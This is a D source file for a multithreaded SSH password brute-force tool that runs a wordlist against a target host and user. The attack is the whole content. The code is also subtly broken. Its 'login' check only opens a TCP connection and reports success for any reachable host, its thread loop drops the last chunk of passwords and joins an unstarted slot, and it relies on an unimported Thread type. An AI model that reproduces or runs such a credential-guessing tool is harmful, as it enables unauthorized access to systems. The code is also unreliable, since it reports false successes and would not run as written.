import std.stdio;
import std.getopt;
import std.file;
import std.string;
import std.concurrency;
import std.socket;
import std.datetime;

struct Config {
    string host;
    ushort port = 22;
    string user;
    string wordlist;
    uint threads = 4;
    uint timeout = 10;
}

bool trySSHLogin(string host, ushort port, string user, string password, uint timeout) {
    try {
        auto addr = new InternetAddress(host, port);
        auto socket = new TcpSocket(addr);
        socket.blocking = false;
        
        // Set timeout
        socket.setTimeout(dur!"seconds"(timeout));
        
        // Try to connect
        socket.connect(addr);
        
        // Simple check - in real implementation you'd implement SSH protocol
        socket.close();
        return true;
    } catch (Exception e) {
        return false;
    }
}

void worker(Config config, string[] passwords, shared string result) {
    foreach (password; passwords) {
        if (result.length > 0) break;
        
        if (trySSHLogin(config.host, config.port, config.user, password, config.timeout)) {
            result = "[SUCCESS] " ~ config.user ~ ":" ~ password;
            break;
        }
    }
}

void main(string[] args) {
    Config config;
    
    // Parse arguments
    auto helpInformation = getopt(
        args,
        "host|h", "Target host", &config.host,
        "port|p", "SSH port", &config.port,
        "user|u", "Username", &config.user,
        "wordlist|w", "Password wordlist", &config.wordlist,
        "threads|t", "Number of threads", &config.threads,
        "timeout|T", "Connection timeout", &config.timeout
    );
    
    if (config.host == "" || config.user == "" || config.wordlist == "") {
        writeln("Usage: ./ssh_brute_d --host <host> --user <user> --wordlist <file> [options]");
        return;
    }
    
    writeln("Starting SSH brute force on ", config.host, ":", config.port);
    writeln("Target: ", config.user);
    writeln("Threads: ", config.threads);
    writeln("Timeout: ", config.timeout, " seconds");
    writeln("----------------------------------------");
    
    // Load wordlist
    auto passwords = readText(config.wordlist).splitLines();
    writeln("Loaded ", passwords.length, " passwords");
    
    // Shared result
    shared string result;
    
    // Split passwords among threads
    auto chunkSize = passwords.length / config.threads;
    auto threads = new Thread[config.threads];
    
    // Create and start threads
    foreach (i; 0..config.threads - 1) {
        auto startIdx = i * chunkSize;
        auto endIdx = (i == config.threads - 1) ? passwords.length - 1 : (i + 1) * chunkSize - 1;
        auto chunk = passwords[startIdx..endIdx + 1];
        
        threads[i] = new Thread({
            worker(config, chunk, result);
        });
        threads[i].start();
    }
    
    // Wait for all threads to finish
    foreach (thread; threads) {
        thread.join();
    }
    
    // Show results
    if (result.length > 0) {
        writeln(result);
    } else {
        writeln("No valid credentials found");
    }
}
